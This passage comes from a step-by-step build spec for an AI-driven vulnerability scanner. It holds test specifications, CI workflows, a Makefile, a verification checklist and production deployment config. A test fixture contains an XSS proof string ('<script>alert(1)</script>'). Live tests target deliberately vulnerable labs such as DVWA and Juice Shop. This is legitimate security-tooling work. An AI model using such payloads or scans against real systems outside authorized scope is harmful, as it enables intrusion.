  finding = {
    "title": "XSS", "severity": "high",
    "evidence": "Alert fired",
    "poc_description": "Submit <script>alert(1)</script>",
    "poc_script": "import requests\n...",
    "technical_analysis": "Reflected in response"
  }
  
  result = _normalize_finding(finding)
  
  Assert: "Evidence" in result["evidence"]
  Assert: "PoC Description" in result["evidence"]
  Assert: "PoC Script" in result["evidence"]
  Assert: "Technical Analysis" in result["evidence"]

@pytest.mark.strix
test_dedup_corroborates_existing_finding(db_session):
  existing = FindingFactory(
    title="SQL Injection in login",
    affected_url="https://example.com/login",
    is_confirmed=False,
    evidence="Original evidence"
  )
  db_session.add(existing)
  await db_session.commit()
  
  strix_finding = {
    "title": "SQL Injection in the login endpoint",
    "severity": "HIGH",
    "affected_url": "https://example.com/login",
    "evidence": "Strix confirmed the vulnerability",
    "poc_script": "exploit_code = True"
  }
  
  normalizer = StrixResultNormalizer(db_session)
  new_findings = await normalizer.normalize_and_deduplicate(
    [strix_finding], str(existing.scan_id), db_session
  )
  
  # No new finding created (it's a duplicate)
  Assert: len(new_findings) == 0
  
  # Existing finding updated
  await db_session.refresh(existing)
  Assert: existing.is_confirmed == True
  Assert: "CORROBORATED BY STRIX" in existing.evidence

@pytest.mark.strix
test_url_path_similarity():
  Assert: _url_path_similarity(
    "https://example.com/api/users/1",
    "https://example.com/api/users/2"
  ) > 0.8
  
  Assert: _url_path_similarity(
    "https://example.com/login",
    "https://example.com/dashboard"
  ) < 0.3

─────────────────────────────────────────

class TestScanModes:

@pytest.mark.strix
test_autonomous_skips_vuln_and_secrets_agents(
  mock_celery, db_session, fake_redis):

  scan = ScanFactory(scan_mode="AUTONOMOUS")
  org = OrganizationFactory(authorized_scope_confirmed=True)
  scan.organization_id = org.id
  db_session.add_all([org, scan])
  await db_session.commit()
  
  With settings: strix.enabled = True:
    event = EnumCompleteEvent(
      scan_id=str(scan.id),
      live_host_count=5,
      open_ports=[80, 443],
      tech_stack=["nginx"],
      endpoint_count=20
    )
    await orchestrator.on_enum_complete(event)
  
  dispatched_names = [t.name for t in mock_celery.tasks]
  
  Assert: "vuln.start" NOT in dispatched_names
  Assert: "secrets.start" NOT in dispatched_names
  Assert: "strix.start" in dispatched_names
  
  # Vuln + secrets flags pre-set in Redis
  vuln_flag = await fake_redis.get(
    f"agentsec:vuln_complete:{scan.id}"
  )
  secrets_flag = await fake_redis.get(
    f"agentsec:secrets_complete:{scan.id}"
  )
  Assert: vuln_flag is not None
  Assert: secrets_flag is not None

@pytest.mark.strix
test_classic_mode_never_references_strix(
  mock_celery, db_session, fake_redis):

  scan = ScanFactory(scan_mode="CLASSIC")
  db_session.add(scan)
  await db_session.commit()
  
  event = EnumCompleteEvent(scan_id=str(scan.id),
    live_host_count=5, open_ports=[80],
    tech_stack=["nginx"], endpoint_count=10)
  await orchestrator.on_enum_complete(event)
  
  dispatched = [t.name for t in mock_celery.tasks]
  Assert: "strix.start" NOT in dispatched

Generate tests/test_strix.py only. Stop after.
```

---

### Step 14.8 — Frontend Tests

```
PHASE 14 — STEP 8

Generate: frontend/tests/test_components.js
          frontend/tests/test_pages.js
          frontend/vitest.config.js

─────────────────────────────────────────

vitest.config.js:

import { defineConfig } from 'vitest/config'
import react from '@vitejs/plugin-react'

export default defineConfig({
  plugins: [react()],
  test: {
    environment: 'jsdom',
    globals: true,
    setupFiles: ['./tests/setup.js'],
    coverage: {
      provider: 'v8',
      reporter: ['text', 'html'],
      thresholds: { lines: 75, functions: 75 },
    },
  },
})

─────────────────────────────────────────

tests/setup.js:

import '@testing-library/jest-dom'
import { vi } from 'vitest'

// Mock framer-motion (avoid animation in tests)
vi.mock('framer-motion', () => ({
  motion: {
    div: ({ children, ...props }) => <div {...props}>{children}</div>,
    span: ({ children, ...props }) => <span {...props}>{children}</span>,
    button: ({ children, ...props }) => <button {...props}>{children}</button>,
  },
  AnimatePresence: ({ children }) => children,
}))

// Mock Three.js (avoid WebGL in tests)
vi.mock('three', () => ({
  WebGLRenderer: vi.fn(() => ({
    setSize: vi.fn(),
    render: vi.fn(),
    domElement: document.createElement('canvas'),
    dispose: vi.fn(),
  })),
  Scene: vi.fn(() => ({ add: vi.fn() })),
  PerspectiveCamera: vi.fn(() => ({ position: { z: 0 } })),
  IcosahedronGeometry: vi.fn(),
  MeshBasicMaterial: vi.fn(),
  Mesh: vi.fn(() => ({ rotation: { x: 0, y: 0 }, position: {} })),
}))

// Mock IntersectionObserver
global.IntersectionObserver = vi.fn(() => ({
  observe: vi.fn(),
  unobserve: vi.fn(),
  disconnect: vi.fn(),
}))

// Mock window.matchMedia
Object.defineProperty(window, 'matchMedia', {
  writable: true,
  value: vi.fn().mockImplementation(query => ({
    matches: false,
    media: query,
    addListener: vi.fn(),
    removeListener: vi.fn(),
  })),
})

─────────────────────────────────────────

tests/test_components.js:

import { render, screen, fireEvent, waitFor } from '@testing-library/react'
import userEvent from '@testing-library/user-event'

describe('StatCard', () => {

  test('renders large number and label', () => {
    render(<StatCard value={42} label="SCANS" />)
    Assert: screen.getByText('SCANS') exists
    // Number may start at 0 and animate up — check label
  })

  test('shows trend arrow when trend provided', () => {
    render(<StatCard value={42} label="SCANS" trend={12} />)
    const element = screen.getByTestId('trend-indicator')
    Assert: element has positive trend class
  })

  test('shows red when critical severity', () => {
    render(<StatCard value={5} label="CRITICAL" color="critical" />)
    const number = screen.getByTestId('stat-number')
    Assert: number has critical color class
  })

})

describe('SeverityBadge', () => {

  test.each([
    ['CRITICAL', 'critical'],
    ['HIGH', 'high'],
    ['MEDIUM', 'medium'],
    ['LOW', 'low'],
    ['INFO', 'info'],
  ])('renders %s severity correctly', (severity, cssClass) => {
    render(<SeverityBadge severity={severity} />)
    const badge = screen.getByTestId('severity-badge')
    Assert: badge has class matching cssClass
    Assert: screen.getByText(severity) exists
  })

})

describe('Button', () => {

  test('primary variant renders with brand background', () => {
    render(<Button variant="primary">Click me</Button>)
    const btn = screen.getByRole('button')
    Assert: btn has brand bg class
  })

  test('shows spinner when loading', () => {
    render(<Button loading={true}>Submit</Button>)
    Assert: screen.getByTestId('spinner') exists
    Assert: screen.queryByText('Submit') is null
  })

  test('disabled when loading', () => {
    render(<Button loading={true}>Submit</Button>)
    const btn = screen.getByRole('button')
    Assert: btn is disabled
  })

  test('danger variant has critical color', () => {
    render(<Button variant="danger">Delete</Button>)
    const btn = screen.getByRole('button')
    Assert: btn has danger/critical class
  })

})

describe('ProgressBar', () => {

  test('fill width matches value', () => {
    render(<ProgressBar value={60} />)
    const fill = screen.getByTestId('progress-fill')
    Assert: fill has style with width 60%
  })

  test('green color at low value', () => {
    render(<ProgressBar value={20} />)
    const fill = screen.getByTestId('progress-fill')
    Assert: fill has green color class
  })

  test('red color at high value', () => {
    render(<ProgressBar value={85} />)
    const fill = screen.getByTestId('progress-fill')
    Assert: fill has red/critical color class
  })

})

describe('Modal', () => {

  test('renders children when open', () => {
    render(
      <Modal isOpen={true} onClose={vi.fn()} title="Test">
        <div>Modal content</div>
      </Modal>
    )
    Assert: screen.getByText('Modal content') exists
    Assert: screen.getByText('Test') exists
  })

  test('not rendered when closed', () => {
    render(
      <Modal isOpen={false} onClose={vi.fn()} title="Test">
        <div>Content</div>
      </Modal>
    )
    Assert: screen.queryByText('Content') is null
  })

  test('calls onClose when X clicked', async () => {
    const onClose = vi.fn()
    render(<Modal isOpen={true} onClose={onClose} title="Test">content</Modal>)
    await userEvent.click(screen.getByRole('button', { name: /close/i }))
    Assert: onClose.mock.calls.length == 1
  })

})

─────────────────────────────────────────

tests/test_pages.js:

import { render, screen, waitFor } from '@testing-library/react'
import { MemoryRouter, Route, Routes } from 'react-router-dom'
import { QueryClient, QueryClientProvider } from '@tanstack/react-query'
import { vi } from 'vitest'

// Setup query client for tests
const createTestQueryClient = () => new QueryClient({
  defaultOptions: { queries: { retry: false } }
})

const wrapper = ({ children }) => (
  <QueryClientProvider client={createTestQueryClient()}>
    <MemoryRouter>{children}</MemoryRouter>
  </QueryClientProvider>
)

describe('LoginPage', () => {

  test('renders Continue button not Sign In', () => {
    render(<LoginPage />, { wrapper })
    Assert: screen.getByRole('button', { name: /continue/i }) exists
    Assert: screen.queryByRole('button', { name: /sign in/i }) is null
  })

  test('shows error on invalid email format', async () => {
    render(<LoginPage />, { wrapper })
    await userEvent.type(screen.getByPlaceholderText(/email/i), 'notanemail')
    await userEvent.click(screen.getByRole('button', { name: /continue/i }))
    Assert: screen.getByText(/invalid email/i) exists
  })

  test('no API call on empty form', async () => {
    const mockLogin = vi.fn()
    render(<LoginPage onLogin={mockLogin} />, { wrapper })
    await userEvent.click(screen.getByRole('button', { name: /continue/i }))
    Assert: mockLogin.mock.calls.length == 0
  })

})

describe('UserDashboard', () => {

  test('renders welcome with username', async () => {
    vi.mock('../src/store/authStore', () => ({
      useAuthStore: () => ({ user: { username: 'parth' } })
    }))
    vi.mock('../src/api/dashboard', () => ({
      fetchDashboardStats: vi.fn().mockResolvedValue({
        total_scans: 42,
        total_findings: 157,
        critical_findings: 3,
        risk_score: 67,
        recent_scans: [],
      })
    }))
    
    render(<UserDashboard />, { wrapper })
    
    await waitFor(() => {
      Assert: screen.getByText(/parth/i) exists
    })
  })

  test('shows 4 stat cards', async () => {
    render(<UserDashboard />, { wrapper })
    
    await waitFor(() => {
      const cards = screen.getAllByTestId('stat-card')
      Assert: cards.length == 4
    })
  })

})

describe('VulnerabilityDashboard', () => {

  test('severity filter applies correctly', async () => {
    const mockFindings = [
      { id: '1', title: 'SQLi', severity: 'CRITICAL',
        owasp_category: 'A05:2025', tool_found_by: 'sqlmap',
        affected_url: 'https://example.com/login' },
      { id: '2', title: 'XSS', severity: 'HIGH',
        owasp_category: 'A05:2025', tool_found_by: 'dalfox',
        affected_url: 'https://example.com/search' },
    ]
    
    vi.mock('../src/api/findings', () => ({
      fetchFindings: vi.fn().mockResolvedValue({
        data: mockFindings,
        pagination: { total: 2, page: 1, total_pages: 1 }
      })
    }))
    
    render(
      <MemoryRouter initialEntries={['/scans/test-id/findings']}>
        <Routes>
          <Route path="/scans/:id/findings"
                 element={<VulnerabilityDashboard />} />
        </Routes>
      </MemoryRouter>,
      { wrapper }
    )
    
    await waitFor(() => {
      Assert: screen.getByText('SQLi') exists
      Assert: screen.getByText('XSS') exists
    })
    
    await userEvent.click(screen.getByTestId('filter-CRITICAL'))
    
    await waitFor(() => {
      Assert: screen.getByText('SQLi') exists
      Assert: screen.queryByText('XSS') is null
    })
  })

})

describe('AuthGuard', () => {

  test('redirects to login when not authenticated', () => {
    vi.mock('../src/store/authStore', () => ({
      useAuthStore: () => ({ isAuthenticated: false, user: null })
    }))
    
    render(
      <MemoryRouter initialEntries={['/']}>
        <Routes>
          <Route path="/" element={
            <AuthGuard><div>Protected</div></AuthGuard>
          } />
          <Route path="/login" element={<div>Login Page</div>} />
        </Routes>
      </MemoryRouter>
    )
    
    Assert: screen.getByText('Login Page') exists
    Assert: screen.queryByText('Protected') is null
  })

})

Generate all 3 files. Stop after.
```

---

### Step 14.9 — Performance Tests

```
PHASE 14 — STEP 9

Generate: tests/test_performance.py

─────────────────────────────────────────

@pytest.mark.slow
class TestPerformanceBenchmarks:

test_bulk_insert_1000_subdomains(db_session):
  @pytest.mark.integration
  
  subdomains = [
    Subdomain(
      id=uuid4(),
      name=f"sub{i}.example.com",
      scan_id=uuid4(),
      is_alive=True,
      state="DISCOVERED",
      source="subfinder",
      created_at=datetime.utcnow()
    )
    for i in range(1000)
  ]
  
  start = asyncio.get_event_loop().time()
  db_session.add_all(subdomains)
  await db_session.commit()
  duration = asyncio.get_event_loop().time() - start
  
  Assert: duration < 5.0, \
    f"Bulk insert took {duration:.2f}s (limit: 5s)"

test_finding_query_500_records(db_session):
  @pytest.mark.integration
  scan_id = uuid4()
  
  FindingFactory.create_batch(500, scan_id=scan_id)
  await db_session.commit()
  
  start = asyncio.get_event_loop().time()
  results = await db_session.execute(
    select(Finding)
    .where(Finding.scan_id == scan_id)
    .where(Finding.severity == "HIGH")
    .order_by(Finding.cvss_score.desc())
    .limit(20)
  )
  results.scalars().all()
  duration = asyncio.get_event_loop().time() - start
  
  Assert: duration < 0.5, \
    f"Paginated query took {duration:.2f}s (limit: 0.5s)"

test_deduplication_5000_subdomains():
  from backend.workers.processors.deduplicator import (
    SubdomainDeduplicator
  )
  
  deduplicator = SubdomainDeduplicator()
  
  # 5 tools each finding same 1000 subdomains
  mock_outputs = []
  for tool in ["subfinder","amass","assetfinder",
               "findomain","chaos"]:
    output = MagicMock()
    output.parsed_data = [
      {"subdomain": f"sub{i}.example.com",
       "source": [tool], "tool": tool}
      for i in range(1000)
    ]
    mock_outputs.append(output)
  
  start = asyncio.get_event_loop().time()
  result = deduplicator.deduplicate(mock_outputs, "example.com")
  duration = asyncio.get_event_loop().time() - start
  
  Assert: duration < 1.0, \
    f"Dedup of 5000 items took {duration:.2f}s (limit: 1s)"
  Assert: len(result) == 1000
    (All 5 tools found same 1000 — result is 1000 unique)

test_api_response_time_scans_endpoint(api_client, auth_headers):
  @pytest.mark.integration
  
  # Create 50 scans
  ScanFactory.create_batch(50)
  await db_session.commit()
  
  import time
  start = time.time()
  response = api_client.get(
    "/api/v1/scans?page=1&page_size=20",
    headers=auth_headers
  )
  duration = time.time() - start
  
  Assert: response.status_code == 200
  Assert: duration < 0.5, \
    f"Scan list took {duration:.2f}s (limit: 0.5s)"

test_regex_extraction_large_js_file():
  from backend.workers.modules.js_secret_extractor import (
    JSSecretExtractor
  )
  extractor = JSSecretExtractor(mock_executor, mock_event_bus,
                                 mock_db)
  
  # Simulate a large minified JS file
  large_js = "var x='normal';\n" * 10000
  large_js += "const key = 'AKIAIOSFODNN7EXAMPLE123456';\n"
  large_js += "var y='morenormal';\n" * 5000
  
  import time
  start = time.time()
  findings = extractor._regex_extract(large_js, "bundle.js")
  duration = time.time() - start
  
  Assert: duration < 2.0, \
    f"Regex scan took {duration:.2f}s (limit: 2s)"
  Assert: any(f.secret_type == "aws_access_key"
              for f in findings)

Generate tests/test_performance.py only. Stop after.
```

---

### Step 14.10 — CI/CD Pipeline

```
PHASE 14 — STEP 10

Generate:
  .github/workflows/ci.yml
  .github/workflows/security-scan.yml
  Makefile

─────────────────────────────────────────

.github/workflows/ci.yml:

name: AgentSec AI — CI

on:
  push:
    branches: [main, dev, 'feature/**']
  pull_request:
    branches: [main, dev]

env:
  PYTHON_VERSION: "3.11"
  NODE_VERSION: "20"

jobs:

  backend-tests:
    name: Backend Tests
    runs-on: ubuntu-latest

    services:
      postgres:
        image: postgres:16-alpine
        env:
          POSTGRES_USER: test
          POSTGRES_PASSWORD: test
          POSTGRES_DB: agentsec_test
        ports: ["5433:5432"]
        options: >-
          --health-cmd pg_isready
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5

      redis:
        image: redis:7-alpine
        ports: ["6380:6379"]
        options: >-
          --health-cmd "redis-cli ping"
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5

    steps:
      - uses: actions/checkout@v4

      - name: Set up Python ${{ env.PYTHON_VERSION }}
        uses: actions/setup-python@v5
        with:
          python-version: ${{ env.PYTHON_VERSION }}
          cache: pip

      - name: Install dependencies
        run: pip install -r requirements.txt

      - name: Run Alembic migrations
        env:
          DATABASE_URL: postgresql+asyncpg://test:test@localhost:5433/agentsec_test
        run: alembic upgrade head

      - name: Run unit + integration tests
        env:
          DATABASE_URL: postgresql+asyncpg://test:test@localhost:5433/agentsec_test
          REDIS_URL: redis://localhost:6380/0
          CELERY_BROKER_URL: redis://localhost:6380/0
          CELERY_RESULT_BACKEND: redis://localhost:6380/0
          APP_ENV: testing
          APP_DEBUG: "True"
          SECRET_KEY: "ci-test-secret-key-64-chars-minimum-xxxxxxxxxxxxxxxxxxxxxxxxxx"
          JWT_SECRET_KEY: "ci-test-jwt-key-64-chars-minimum-xxxxxxxxxxxxxxxxxxxxxxxxx"
          ANTHROPIC_API_KEY: "test-key-not-real"
          STRIX_AGENT_ENABLED: "False"
          EXPLOIT_AGENT_ENABLED: "False"
        run: |
          pytest tests/ \
            -m "not live and not slow and not e2e" \
            --cov=backend \
            --cov-report=xml:coverage.xml \
            --cov-report=html:coverage_report \
            --cov-fail-under=85 \
            -v

      - name: Upload coverage to Codecov
        uses: codecov/codecov-action@v4
        with:
          file: coverage.xml
          flags: backend
          fail_ci_if_error: false

  frontend-tests:
    name: Frontend Tests
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v4

      - name: Set up Node.js ${{ env.NODE_VERSION }}
        uses: actions/setup-node@v4
        with:
          node-version: ${{ env.NODE_VERSION }}
          cache: npm
          cache-dependency-path: frontend/package-lock.json

      - name: Install deps
        working-directory: frontend
        run: npm ci

      - name: Run tests
        working-directory: frontend
        run: npx vitest run --coverage

      - name: Build
        working-directory: frontend
        run: npm run build

  lint:
    name: Lint + Format
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: ${{ env.PYTHON_VERSION }}

      - run: pip install ruff black isort
      - run: ruff check backend/ tests/
      - run: black --check backend/ tests/
      - run: isort --check-only backend/ tests/

─────────────────────────────────────────

.github/workflows/security-scan.yml:

name: AgentSec AI — Security Scan

on:
  schedule:
    - cron: '0 2 * * 1'  # Every Monday at 2 AM
  workflow_dispatch:

jobs:
  dependency-audit:
    name: Dependency Vulnerability Audit
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: "3.11"
      - run: pip install pip-audit
      - run: pip-audit -r requirements.txt --format=json
               --output=audit.json || true
      - uses: actions/upload-artifact@v4
        with:
          name: pip-audit-results
          path: audit.json

  npm-audit:
    name: NPM Security Audit
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: "20"
      - working-directory: frontend
        run: npm audit --audit-level=high

  secret-scan:
    name: Secret Scanning (Gitleaks)
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - uses: gitleaks/gitleaks-action@v2
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

─────────────────────────────────────────

Makefile:

.PHONY: test test-unit test-integration test-api
        test-security test-strix test-frontend
        test-performance test-all test-live
        coverage lint format docker-test
        migrate clean

# ── Test targets ───────────────────────────────────────

test-unit:
	pytest tests/ -m "unit" -v

test-integration:
	pytest tests/ -m "integration" -v

test-api:
	pytest tests/ -m "api" -v

test-security:
	pytest tests/ -m "security" -v

test-strix:
	pytest tests/ -m "strix" -v

test-pipeline:
	pytest tests/ -m "agent" -v

test-performance:
	pytest tests/ -m "slow" -v

test-frontend:
	cd frontend && npx vitest run

test-all:
	pytest tests/ -m "not live and not e2e" -v
	cd frontend && npx vitest run

# Live tests — manual only, needs real tools + internet
test-live:
	@echo "⚠️  Running live tests against real targets."
	@echo "⚠️  Requires: tools installed + internet access."
	@echo "⚠️  Legal target only: scanme.nmap.org"
	pytest tests/ -m "live" -v -s

# ── Coverage ───────────────────────────────────────────

coverage:
	pytest tests/ -m "not live and not e2e" \
		--cov=backend \
		--cov-report=html:coverage_report \
		--cov-report=term-missing \
		--cov-fail-under=85
	@echo "Coverage report: coverage_report/index.html"

# ── Code quality ───────────────────────────────────────

lint:
	ruff check backend/ tests/
	black --check backend/ tests/
	isort --check-only backend/ tests/

format:
	black backend/ tests/
	isort backend/ tests/
	ruff check --fix backend/ tests/

# ── Docker ─────────────────────────────────────────────

docker-test:
	docker compose -f docker-compose.test.yml up \
		--build --abort-on-container-exit
	docker compose -f docker-compose.test.yml down

# ── Database ───────────────────────────────────────────

migrate:
	alembic upgrade head

migrate-new:
	alembic revision --autogenerate -m "$(MSG)"

migrate-down:
	alembic downgrade -1

# ── Cleanup ────────────────────────────────────────────

clean:
	find . -type d -name __pycache__ | xargs rm -rf
	find . -name "*.pyc" -delete
	find . -name "*.pyo" -delete
	rm -rf .coverage coverage.xml coverage_report/
	rm -rf frontend/dist/ frontend/coverage/
	rm -rf .pytest_cache/ .ruff_cache/
	rm -f /tmp/agentsec_*.txt /tmp/agentsec_*.md

Generate all 3 files. Stop after.
```

---

### Step 14.11 — Final Verification

```
PHASE 14 — STEP 11 — FINAL VERIFICATION

─────────────────────────────────────────

STEP 1: Run full unit test suite

  make test-unit

  Expected output (all green):
  tests/test_models.py          ........ PASSED (12 tests)
  tests/test_plugins.py         ........ PASSED (18 tests)
  tests/test_pipeline.py        ........ PASSED (partial — unit only)
  tests/test_security.py        ........ PASSED (14 tests)
  tests/test_strix.py           ........ PASSED (16 tests)
  tests/test_performance.py     ........ SKIPPED (marked slow)
  
  ZERO failures. ZERO errors.

─────────────────────────────────────────

STEP 2: Run integration tests

  docker compose -f docker-compose.test.yml up -d \
    test_postgres test_redis
  
  make test-integration
  make test-api

  Expected: all pass. No DB connection errors.

─────────────────────────────────────────

STEP 3: Run security tests

  make test-security

  Every security test must pass:
  □ alg:none JWT rejected
  □ Expired JWT rejected
  □ Wrong secret JWT rejected
  □ All private IPs rejected
  □ SQL injection in target rejected
  □ XSS in target rejected
  □ IDOR between users blocked
  □ Secrets never returned in full via API
  □ PDF file path not in API response
  □ Token blacklisted after logout

─────────────────────────────────────────

STEP 4: Run Strix tests

  make test-strix

  Critical checks:
  □ STRIX disabled by default
  □ All 3 gates block correctly
  □ max_retries == 0 on Celery task
  □ --non-interactive always in command
  □ Dedup corroborates existing findings
  □ AUTONOMOUS mode skips vuln/secrets agents

─────────────────────────────────────────

STEP 5: Run frontend tests

  make test-frontend

  Expected:
  ✓ test_components.js — 20 tests passed
  ✓ test_pages.js      — 12 tests passed
  
  Coverage: >= 75%

─────────────────────────────────────────

STEP 6: Generate coverage report

  make coverage

  Required:
  backend coverage: >= 85%
  
  Open: coverage_report/index.html
  Verify: no critical module below 70%

─────────────────────────────────────────

STEP 7: Docker full test suite

  make docker-test

  All containers exit with code 0.

─────────────────────────────────────────

STEP 8: Live tests (manual)

  Setup:
    docker run -d -p 8080:80 vulnerables/web-dvwa
    docker run -d -p 3000:3000 bkimminich/juice-shop
  
  make test-live
  
  Expected on DVWA:
    SQLi finding: ✅
    XSS finding: ✅
    Default credentials (admin/password): ✅
  
  Expected on Juice Shop:
    JWT misconfiguration: ✅
    Missing security headers: ✅
    API endpoints discovered: ✅
    Broken access control: ✅

─────────────────────────────────────────

Phase 14 complete when:
  □ All unit tests pass
  □ All integration tests pass
  □ All API tests pass
  □ All security tests pass
  □ All Strix tests pass
  □ Frontend tests >= 75% coverage
  □ Backend coverage >= 85%
  □ Docker test suite exits 0
  □ CI pipeline passes on GitHub
  □ No critical module below 70% coverage
```

---
---

# PHASE 15 — DEPLOY

---

### Step 15.0 — Phase 15 Master Context

```
PHASE 15 — DOCKERIZE + DEPLOY

Phase 14 complete. All tests passing.
Now building production-ready deployment.

This phase covers:
  A. Production Docker Compose (hardened)
  B. Environment configuration (prod vs dev)
  C. Nginx reverse proxy + SSL
  D. Database backups + health monitoring
  E. Celery monitoring (Flower)
  F. Log aggregation
  G. One-command deploy script
  H. Update + rollback procedure

Target deployment: Single Linux server
  Minimum spec: 4 CPU, 8GB RAM, 80GB SSD
  OS: Ubuntu 22.04 LTS
  Docker + Docker Compose v2

Production security hardening:
  No exposed DB/Redis ports externally
  All traffic through Nginx (SSL only)
  Non-root containers
  Read-only filesystems where possible
  Secret management via .env (never in image)
  Rate limiting at Nginx level
  Container resource limits enforced

Token rule:
Generate in order, wait for "next" between each:
  Step 15.1: Production environment config
  Step 15.2: Production Docker Compose
  Step 15.3: Nginx configuration
  Step 15.4: SSL setup (Let's Encrypt)
  Step 15.5: Database backup system
  Step 15.6: Health monitoring
  Step 15.7: Deploy script
  Step 15.8: Update + rollback procedure
  Step 15.9: Verification
```

---

### Step 15.1 — Production Environment Config

```
PHASE 15 — STEP 1

Generate:
  .env.production.example
  scripts/generate_secrets.sh

─────────────────────────────────────────

.env.production.example:

# ── AgentSec AI — Production Configuration ────────────
# Copy to .env.production and fill in real values.
# NEVER commit .env.production to git.
# chmod 600 .env.production

# ── Application ────────────────────────────────────────
APP_NAME=AgentSec AI
APP_ENV=production
APP_DEBUG=False
ALLOWED_HOSTS=yourdomain.com,www.yourdomain.com

# Generate with: openssl rand -hex 32
SECRET_KEY=

# Generate with: openssl rand -hex 32
JWT_SECRET_KEY=

JWT_ALGORITHM=HS256
JWT_ACCESS_TOKEN_EXPIRE_MINUTES=60
JWT_REFRESH_TOKEN_EXPIRE_DAYS=7

# ── Database ────────────────────────────────────────────
POSTGRES_USER=agentsec
# Generate with: openssl rand -base64 24
POSTGRES_PASSWORD=
POSTGRES_DB=agentsecdb
POSTGRES_HOST=postgres
POSTGRES_PORT=5432
DATABASE_URL=postgresql+asyncpg://agentsec:CHANGE_ME@postgres:5432/agentsecdb

# ── Redis ───────────────────────────────────────────────
REDIS_HOST=redis
REDIS_PORT=6379
# Generate with: openssl rand -hex 16
REDIS_PASSWORD=
REDIS_URL=redis://:CHANGE_ME@redis:6379/0
CELERY_BROKER_URL=redis://:CHANGE_ME@redis:6379/0
CELERY_RESULT_BACKEND=redis://:CHANGE_ME@redis:6379/0

# ── AI Integration ──────────────────────────────────────
ANTHROPIC_API_KEY=
OPENAI_API_KEY=

# ── Notifications ───────────────────────────────────────
SLACK_WEBHOOK_URL=
TELEGRAM_BOT_TOKEN=
TELEGRAM_CHAT_ID=
DISCORD_WEBHOOK_URL=

# ── Strix Autonomous Agent ──────────────────────────────
STRIX_AGENT_ENABLED=False
STRIX_LLM=anthropic/claude-sonnet-4-6
STRIX_MAX_BUDGET_USD=10.00
STRIX_MAX_TURNS=200
STRIX_TIMEOUT_SECONDS=3600
STRIX_DEFAULT_SCAN_MODE=standard
STRIX_REASONING_EFFORT=high
STRIX_RUNS_BASE_DIR=/app/strix_runs

# ── Exploit Agent ───────────────────────────────────────
EXPLOIT_AGENT_ENABLED=False

# ── Scan Settings ───────────────────────────────────────
MAX_CONCURRENT_SCANS=5
SCAN_TIMEOUT_SECONDS=3600
TOOL_TIMEOUT_SECONDS=300

# ── Tool Paths (Docker binary locations) ────────────────
SUBFINDER_PATH=/usr/local/bin/subfinder
NMAP_PATH=/usr/bin/nmap
NUCLEI_PATH=/usr/local/bin/nuclei
HTTPX_PATH=/usr/local/bin/httpx
NAABU_PATH=/usr/local/bin/naabu
KATANA_PATH=/usr/local/bin/katana

# ── Nginx ───────────────────────────────────────────────
DOMAIN=yourdomain.com
SSL_EMAIL=admin@yourdomain.com

─────────────────────────────────────────

scripts/generate_secrets.sh:

#!/bin/bash
# Generate all required secrets for production.
# Run once: bash scripts/generate_secrets.sh

echo "Generating AgentSec AI production secrets..."
echo ""

SECRET_KEY=$(openssl rand -hex 32)
JWT_SECRET=$(openssl rand -hex 32)
DB_PASS=$(openssl rand -base64 24 | tr -d '+/=' | head -c 32)
REDIS_PASS=$(openssl rand -hex 16)

echo "Copy these values to your .env.production:"
echo ""
echo "SECRET_KEY=${SECRET_KEY}"
echo "JWT_SECRET_KEY=${JWT_SECRET}"
echo "POSTGRES_PASSWORD=${DB_PASS}"
echo "REDIS_PASSWORD=${REDIS_PASS}"
echo ""
echo "Update DATABASE_URL and REDIS_URL with the password above."
echo ""
echo "⚠️  Store these somewhere safe. They cannot be recovered."

chmod +x scripts/generate_secrets.sh

Generate both files. Stop after.
```

---

### Step 15.2 — Production Docker Compose

```
PHASE 15 — STEP 2

Generate: docker-compose.prod.yml

version: "3.9"

x-common-env: &common-env
  env_file: .env.production
  restart: unless-stopped
  networks:
    - agentsec_internal

x-worker-base: &worker-base
  <<: *common-env
  build:
    context: .
    dockerfile: docker/Dockerfile.worker
  volumes:
    - scan_outputs:/app/scan_outputs
  depends_on:
    postgres:
      condition: service_healthy
    redis:
      condition: service_healthy

services:

  # ── Reverse Proxy ─────────────────────────────────────
  nginx:
    image: nginx:1.25-alpine
    restart: unless-stopped
    ports:
      - "80:80"
      - "443:443"
    volumes:
      - ./docker/nginx/nginx.prod.conf:/etc/nginx/nginx.conf:ro
      - ./docker/nginx/conf.d:/etc/nginx/conf.d:ro
      - certbot_certs:/etc/letsencrypt:ro
      - certbot_webroot:/var/www/certbot:ro
      - static_files:/app/static:ro
    depends_on:
      - backend
    networks:
      - agentsec_internal
      - agentsec_external
    logging:
      driver: "json-file"
      options:
        max-size: "10m"
        max-file: "5"

  # ── Certbot (SSL) ─────────────────────────────────────
  certbot:
    image: certbot/certbot
    restart: "no"
    volumes:
      - certbot_certs:/etc/letsencrypt
      - certbot_webroot:/var/www/certbot
    command: >
      certonly --webroot
      --webroot-path=/var/www/certbot
      --email ${SSL_EMAIL}
      --agree-tos --no-eff-email
      -d ${DOMAIN} -d www.${DOMAIN}
    networks:
      - agentsec_internal

  # ── Database ──────────────────────────────────────────
  postgres:
    image: postgres:16-alpine
    <<: *common-env
    volumes:
      - postgres_data:/var/lib/postgresql/data
      - ./docker/postgres/init.sql:/docker-entrypoint-initdb.d/init.sql:ro
    environment:
      POSTGRES_USER: ${POSTGRES_USER}
      POSTGRES_PASSWORD: ${POSTGRES_PASSWORD}
      POSTGRES_DB: ${POSTGRES_DB}
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U ${POSTGRES_USER} -d ${POSTGRES_DB}"]
      interval: 10s
      timeout: 5s
      retries: 5
      start_period: 30s
    deploy:
      resources:
        limits:
          memory: 2G
    logging:
      driver: "json-file"
      options:
        max-size: "10m"
        max-file: "3"

  # ── Redis ─────────────────────────────────────────────
  redis:
    image: redis:7-alpine
    <<: *common-env
    command: >
      redis-server
      --requirepass ${REDIS_PASSWORD}
      --maxmemory 512mb
      --maxmemory-policy allkeys-lru
      --save 60 1
